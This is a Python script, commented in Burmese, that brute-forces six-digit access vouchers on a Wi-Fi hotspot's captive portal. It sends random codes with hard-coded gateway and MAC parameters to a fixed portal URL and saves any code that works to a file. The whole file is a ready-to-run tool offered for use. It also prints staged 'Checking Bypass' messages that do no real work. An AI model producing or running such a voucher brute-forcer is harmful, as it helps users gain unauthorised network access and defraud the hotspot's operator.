import time
import random
import os
import sys
import requests

# အရောင်သတ်မှတ်ချက်များ
RED = '\033[91m'      # Fail
GREEN = '\033[92m'    # Success
WHITE = '\033[97m'    
CYAN = '\033[96m'
YELLOW = '\033[93m'
END = '\033[0m'

url = "http://10.44.77.240:2060/expire_tip"

def show_menu():
    os.system('clear')
    print(f"{WHITE}[1] Get Internet Access")
    print(f"[2] Bruteforce Access Voucher Code")
    print(f"[3] Recheck Success Code{END}\n")
    option = input(f"{WHITE}Enter an Option: {END}")
    return option

def start_scanning():
    os.system('clear')
    
    # ဗီဒီယိုထဲကအတိုင်း တစ်ဆင့်ချင်း စာတန်းတက်လာစေရန်
    print(f"{CYAN}[+] Checking Bypass...{END}")
    time.sleep(0.5)
    print(f"{CYAN}[+] Done.{END}")
    time.sleep(0.4)
    print(f"{CYAN}[+] Checking user key approval...{END}")
    time.sleep(0.6)
    print(f"{CYAN}[+] This action will take afew minute...{END}")
    time.sleep(0.7)
    print(f"{CYAN}[+] 1-Trying to connect server...{END}")
    time.sleep(1.0)
    print(f"{WHITE}[+] Connection to Server: {GREEN}OK{END}\n")
    time.sleep(0.5)

    while True:
        # 6 digit code ထုတ်ခြင်း
        code = str(random.randint(0, 999999)).zfill(6)
        
        params = {
            'gw_id': '984a6ba4b7ef',
            'gw_sn': 'H1TB01V00212C',
            'gw_address': '192.168.110.1',
            'mac': 'a6:a9:6f:93:0b:bb',
            'voucher': code
        }

        try:
            res = requests.get(url, params=params, timeout=1.5)
            
            # Fail ဖြစ်လျှင် အနီရောင်စာတန်း တန်းစီကျလာမည်
            if "failed" in res.text.lower() or "expire" in res.text.lower():
                print(f"{RED}Fail Code: {code}{END}")
            
            # Success ဖြစ်လျှင် အစိမ်းရောင်ဖြင့်ပြမည်
            elif res.status_code == 200:
                print(f"{GREEN}\n[SUCCESS] FOUND VALID VOUCHER: {code}{END}")
                with open("success.txt", "a") as f:
                    f.write(f"Success: {code} | {time.ctime()}\n")
                break
        except Exception:
            # Server Timeout သို့မဟုတ် ချိတ်ဆက်မှုမရလျှင် အနီရောင်ဖြင့်ပြမည်
            print(f"{RED}Error: {code} (Server Timeout){END}")
        
        # Scanner အမြန်နှုန်း (လိုသလို ညှိနိုင်သည်)
        time.sleep(0.05)

if __name__ == "__main__":
    choice = show_menu()
    if choice == '2':
        start_scanning()
    else:
        print(f"\n{YELLOW}[!] Option {choice} is under maintenance.{END}")
